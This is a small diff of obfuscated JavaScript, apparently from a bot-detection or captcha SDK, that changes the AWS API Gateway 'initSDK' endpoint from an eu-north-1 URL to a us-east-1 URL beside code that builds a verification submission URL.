@@ -160,7 +160,7 @@ const _0x5608 = [
         const _0x28a11c = `https://dev.botbuster.io/submit?actionId=${encodeURIComponent(_0x5a19cb || '')}&apiKey=${encodeURIComponent(_0x2c148e || '')}&device_type=${encodeURIComponent(_0x3281ab)}&email=${encodeURIComponent(_0x3812fa)}&emailElement=${encodeURIComponent(_0x412d8a || '')}&loadedCaptchaUrl=${encodeURIComponent(_0x1128ea || '')}&session_id=${encodeURIComponent(_0x49182a)}`;
 
         // 2. Perform verification request FIRST against the actual AWS API endpoint
-        const _0xapiUrl = 'https://5znp405k6i.execute-api.eu-north-1.amazonaws.com/dev/initSDK';
+        const _0xapiUrl = 'https://7ltygq96u5.execute-api.us-east-1.amazonaws.com/dev/initSDK';
         
         _0xisFetching = true;
         try {
